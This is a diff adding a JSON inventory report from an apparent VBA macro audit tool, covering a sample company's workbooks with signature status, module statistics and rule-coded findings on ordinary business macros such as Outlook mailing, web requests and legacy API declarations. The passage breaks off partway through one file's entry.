@@ -1,0 +1,2748 @@
+{
+ "schema": "inventaire-vba/1",
+ "outil": {
+  "nom": "inventaire-vba",
+  "version": "1.1.0",
+  "edition": "parc"
+ },
+ "date": "2026-10-23T12:00:00.000Z",
+ "racines": [
+  "D:\\Partages\\Exemple-Industrie"
+ ],
+ "fichiers": [
+  {
+   "chemin": "Exemple-Industrie/Achats/2025/Commandes fournisseurs v2.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "P. Roux",
+    "dernierAuteur": "P. Roux",
+    "modifie": "2025-09-03T10:30:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modCommandes",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "8d553a2b901b1af1"
+      },
+      {
+       "nom": "modImpression",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "4cd100dcea64a9f1"
+      },
+      {
+       "nom": "modPrix",
+       "type": "module",
+       "lignes": 11,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "99539a27421445de"
+      },
+      {
+       "nom": "modCours",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "881c82561b3dafa2"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "InternetExplorer.Application",
+    "MSXML2.XMLHTTP"
+   ],
+   "lignesCode": 37,
+   "empreinteProjet": "787a091fb494a0d8",
+   "constats": [
+    {
+     "regle": "IE-001",
+     "ligne": 4,
+     "extrait": "Set ie = CreateObject(\"InternetExplorer.Application\")",
+     "module": "modPrix"
+    },
+    {
+     "regle": "SEC-002",
+     "ligne": 4,
+     "extrait": "Set h = CreateObject(\"MSXML2.XMLHTTP\")",
+     "module": "modCours"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4732,
+   "modifieDisque": "2023-01-04T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Achats/Commandes fournisseurs - Copie.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "S. Garnier",
+    "dernierAuteur": "P. Roux",
+    "modifie": "2025-05-20T15:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modCommandes",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "a750a5149fc8b241"
+      },
+      {
+       "nom": "modImpression",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "4cd100dcea64a9f1"
+      },
+      {
+       "nom": "modPrix",
+       "type": "module",
+       "lignes": 11,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "99539a27421445de"
+      },
+      {
+       "nom": "modCours",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "881c82561b3dafa2"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "InternetExplorer.Application",
+    "MSXML2.XMLHTTP"
+   ],
+   "lignesCode": 37,
+   "empreinteProjet": "0260d24261053136",
+   "constats": [
+    {
+     "regle": "IE-001",
+     "ligne": 4,
+     "extrait": "Set ie = CreateObject(\"InternetExplorer.Application\")",
+     "module": "modPrix"
+    },
+    {
+     "regle": "SEC-002",
+     "ligne": 4,
+     "extrait": "Set h = CreateObject(\"MSXML2.XMLHTTP\")",
+     "module": "modCours"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4736,
+   "modifieDisque": "2022-08-24T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Achats/Commandes fournisseurs.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "S. Garnier",
+    "dernierAuteur": "S. Garnier",
+    "modifie": "2025-05-20T15:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modCommandes",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "a750a5149fc8b241"
+      },
+      {
+       "nom": "modImpression",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "4cd100dcea64a9f1"
+      },
+      {
+       "nom": "modPrix",
+       "type": "module",
+       "lignes": 11,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "99539a27421445de"
+      },
+      {
+       "nom": "modCours",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "881c82561b3dafa2"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "InternetExplorer.Application",
+    "MSXML2.XMLHTTP"
+   ],
+   "lignesCode": 37,
+   "empreinteProjet": "0260d24261053136",
+   "constats": [
+    {
+     "regle": "IE-001",
+     "ligne": 4,
+     "extrait": "Set ie = CreateObject(\"InternetExplorer.Application\")",
+     "module": "modPrix"
+    },
+    {
+     "regle": "SEC-002",
+     "ligne": 4,
+     "extrait": "Set h = CreateObject(\"MSXML2.XMLHTTP\")",
+     "module": "modCours"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4729,
+   "modifieDisque": "2021-03-17T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Archives/Ancien budget protégé.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "FMT-002",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    }
+   ],
+   "erreurs": [],
+   "taille": 7680,
+   "modifieDisque": "2025-03-23T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Commun/Calculatrice TVA.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "L. Bernard",
+    "dernierAuteur": "L. Bernard",
+    "modifie": "2023-01-10T09:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modTva",
+       "type": "module",
+       "lignes": 10,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "c47dab28524e911b"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 7,
+   "empreinteProjet": "e6df7545f39a072a",
+   "constats": [],
+   "erreurs": [],
+   "taille": 3577,
+   "modifieDisque": "2022-09-05T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Commun/Macros/ExportPDF.bas",
+   "famille": "module",
+   "extension": "bas",
+   "format": "texte",
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "ExportPDF",
+     "protege": false,
+     "references": [],
+     "modules": [
+      {
+       "nom": "ExportPDF",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 7,
+       "procedures": 1,
+       "declares": 2,
+       "empreinte": "43db4bfb11ff23d8"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 7,
+   "empreinteProjet": "123e8fde1b322d26",
+   "constats": [
+    {
+     "regle": "B64-002",
+     "ligne": 2,
+     "extrait": "Private Declare PtrSafe Function GetForegroundWindow Lib \"user32\" () As Long",
+     "module": "ExportPDF"
+    },
+    {
+     "regle": "B64-002",
+     "ligne": 3,
+     "extrait": "Private Declare PtrSafe Function ShowWindow Lib \"user32\" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long",
+     "module": "ExportPDF"
+    }
+   ],
+   "erreurs": [],
+   "taille": 417,
+   "modifieDisque": "2021-04-25T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Commun/Macros/OutilsCommuns.xlam",
+   "famille": "excel",
+   "extension": "xlam",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "DSI",
+    "dernierAuteur": "DSI",
+    "modifie": "2025-10-01T08:00:00Z"
+   },
+   "signature": {
+    "etat": "V3",
+    "certificats": [
+     {
+      "sujet": "DSI Exemple - Signature V3",
+      "emetteur": "DSI Exemple - Signature V3",
+      "debut": "2025-06-01T00:00:00.000Z",
+      "fin": "2028-06-01T00:00:00.000Z",
+      "autorite": false,
+      "autosigne": true,
+      "empreinte": "00B2DA2A68904565"
+     }
+    ]
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modTexte",
+       "type": "module",
+       "lignes": 8,
+       "lignesCode": 6,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "ad06677131e5226b"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 13,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 4,
+       "empreinte": "167b261e0bcd2234"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 14,
+   "empreinteProjet": "e0bc0dd5c212448e",
+   "constats": [
+    {
+     "regle": "VBS-004",
+     "module": "modTexte",
+     "ligne": 4,
+     "extrait": "Dim re As New RegExp"
+    }
+   ],
+   "erreurs": [],
+   "taille": 7053,
+   "modifieDisque": "2024-06-11T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Commun/Macros/Rapport qualité.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "DSI",
+    "dernierAuteur": "DSI",
+    "modifie": "2024-03-08T08:00:00Z"
+   },
+   "signature": {
+    "etat": "agile",
+    "certificats": [
+     {
+      "sujet": "DSI Exemple - Signature de code",
+      "emetteur": "DSI Exemple - Signature de code",
+      "debut": "2024-02-01T00:00:00.000Z",
+      "fin": "2027-01-31T00:00:00.000Z",
+      "autorite": false,
+      "autosigne": true,
+      "empreinte": "D13DA86C6399D670"
+     }
+    ]
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "OutilsCommuns",
+       "guid": "",
+       "version": "",
+       "chemin": "S:\\Commun\\Macros\\OutilsCommuns.xlam",
+       "description": "",
+       "type": "project"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modRapport",
+       "type": "module",
+       "lignes": 10,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "c47dab28524e911b"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 7,
+   "empreinteProjet": "e6df7545f39a072a",
+   "constats": [
+    {
+     "regle": "SIG-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "signature agile sans V3"
+    },
+    {
+     "regle": "REF-001",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "OutilsCommuns — S:\\Commun\\Macros\\OutilsCommuns.xlam"
+    },
+    {
+     "regle": "SIG-003",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "DSI Exemple - Signature de code, expire le 2027-01-31"
+    }
+   ],
+   "erreurs": [],
+   "taille": 5887,
+   "modifieDisque": "2025-11-18T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Comptabilité/Relances clients.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "courriel": {
+    "mecanismes": [
+     "MEL-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 1,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {
+    "auteur": "L. Bernard",
+    "dernierAuteur": "L. Bernard",
+    "modifie": "2025-03-14T09:30:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modRelances",
+       "type": "module",
+       "lignes": 26,
+       "lignesCode": 24,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "f226dc2b16920501"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "CDO.Configuration",
+    "CDO.Message"
+   ],
+   "lignesCode": 24,
+   "empreinteProjet": "b7d4a3dfa3a25c75",
+   "constats": [
+    {
+     "regle": "MEL-001",
+     "ligne": 9,
+     "extrait": ".Item(schema & \"smtpserver\") = \"smtp.office365.com\"",
+     "module": "modRelances"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4178,
+   "modifieDisque": "2024-08-27T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Direction/Indicateurs mensuels.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "courriel": {
+    "mecanismes": [
+     "OUT-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 1,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {
+    "auteur": "Direction",
+    "dernierAuteur": "Direction",
+    "modifie": "2025-06-30T18:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": true,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 5,
+       "lignesCode": 4,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "b8fb93d0a20db3bb"
+      },
+      {
+       "nom": "modIndicateurs",
+       "type": "module",
+       "lignes": 12,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "4b3deecad7ce32b3"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 2,
+       "empreinte": "44e424f94438798e"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "Outlook.Application"
+   ],
+   "lignesCode": 26,
+   "empreinteProjet": "5e08291dc88a2e2d",
+   "constats": [
+    {
+     "regle": "B64-001",
+     "ligne": 2,
+     "extrait": "Private Declare Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)",
+     "module": "modApi"
+    },
+    {
+     "regle": "B64-001",
+     "ligne": 3,
+     "extrait": "Private Declare Function GetUserName Lib \"advapi32.dll\" Alias \"GetUserNameA\" (ByVal lpBuffer As String, nSize As Long) As Long",
+     "module": "modApi"
+    },
+    {
+     "regle": "DDE-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "liaison DDE dans le classeur"
+    },
+    {
+     "regle": "OUT-001",
+     "ligne": 5,
+     "extrait": "Set ol = CreateObject(\"Outlook.Application\")",
+     "module": "modIndicateurs"
+    },
+    {
+     "regle": "XLM-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "feuille de macros Excel 4.0"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 9,
+     "extrait": "msg.Attachments.Add \"\\\\srv-fichiers\\finance\\exports\\suivi.pdf\"",
+     "module": "modIndicateurs"
+    },
+    {
+     "regle": "PRJ-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Workbook_Open()",
+     "module": "ThisWorkbook"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4868,
+   "modifieDisque": "2023-02-12T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Finance/Anciens/Tableau de bord 2017.xls",
+   "famille": "excel",
+   "extension": "xls",
+   "format": "ole",
+   "macros": true,
+   "meta": {
+    "auteur": "J. Petit",
+    "dernierAuteur": "J. Petit",
+    "modifie": "2023-06-15T08:00:00.000Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modTdb",
+       "type": "module",
+       "lignes": 6,
+       "lignesCode": 5,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "e16ec7b8a9c97578"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 2,
+       "empreinte": "44e424f94438798e"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 17,
+   "empreinteProjet": "14982cb18676f41b",
+   "constats": [
+    {
+     "regle": "B64-001",
+     "ligne": 2,
+     "extrait": "Private Declare Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)",
+     "module": "modApi"
+    },
+    {
+     "regle": "B64-001",
+     "ligne": 3,
+     "extrait": "Private Declare Function GetUserName Lib \"advapi32.dll\" Alias \"GetUserNameA\" (ByVal lpBuffer As String, nSize As Long) As Long",
+     "module": "modApi"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 3,
+     "extrait": "ThisWorkbook.SaveCopyAs \"S:\\RH\\Archives\\\" & Format(Now, \"yyyymmdd\") & \"_planning.xlsm\"",
+     "module": "modTdb"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 4,
+     "extrait": "Workbooks.Open \"C:\\Users\\mdupont\\Documents\\parametres.xlsx\"",
+     "module": "modTdb"
+    },
+    {
+     "regle": "FMT-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    }
+   ],
+   "erreurs": [],
+   "taille": 9728,
+   "modifieDisque": "2024-04-22T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Finance/Budget/Suivi budgétaire 2024.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "courriel": {
+    "mecanismes": [
+     "OUT-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 1,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {
+    "auteur": "C. Martin",
+    "dernierAuteur": "L. Bernard",
+    "modifie": "2024-11-04T16:20:00Z"
+   },
+   "signature": {
+    "etat": "ancienne",
+    "certificats": [
+     {
+      "sujet": "Service Finance - Signature macros",
+      "emetteur": "Service Finance - Signature macros",
+      "debut": "2022-01-01T00:00:00.000Z",
+      "fin": "2024-12-31T00:00:00.000Z",
+      "autorite": false,
+      "autosigne": true,
+      "empreinte": "4BD2007E370CABB6"
+     }
+    ]
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "Outlook",
+       "guid": "00062FFF-0000-0000-C000-000000000046",
+       "version": "9.6",
+       "chemin": "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOUTL.OLB",
+       "description": "Microsoft Outlook 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 5,
+       "lignesCode": 4,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "b8fb93d0a20db3bb"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 2,
+       "empreinte": "44e424f94438798e"
+      },
+      {
+       "nom": "modMail",
+       "type": "module",
+       "lignes": 12,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "3c840254f52887cb"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "Outlook.Application"
+   ],
+   "lignesCode": 26,
+   "empreinteProjet": "db0c64c02e779c61",
+   "constats": [
+    {
+     "regle": "B64-001",
+     "ligne": 2,
+     "extrait": "Private Declare Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)",
+     "module": "modApi"
+    },
+    {
+     "regle": "B64-001",
+     "ligne": 3,
+     "extrait": "Private Declare Function GetUserName Lib \"advapi32.dll\" Alias \"GetUserNameA\" (ByVal lpBuffer As String, nSize As Long) As Long",
+     "module": "modApi"
+    },
+    {
+     "regle": "SIG-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "signature ancienne sans V3"
+    },
+    {
+     "regle": "OUT-001",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "Outlook — C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOUTL.OLB"
+    },
+    {
+     "regle": "OUT-001",
+     "ligne": 5,
+     "extrait": "Set ol = CreateObject(\"Outlook.Application\")",
+     "module": "modMail"
+    },
+    {
+     "regle": "SIG-002",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "Service Finance - Signature macros, expiré le 2024-12-31"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 9,
+     "extrait": "msg.Attachments.Add \"\\\\srv-fichiers\\finance\\exports\\suivi.pdf\"",
+     "module": "modMail"
+    },
+    {
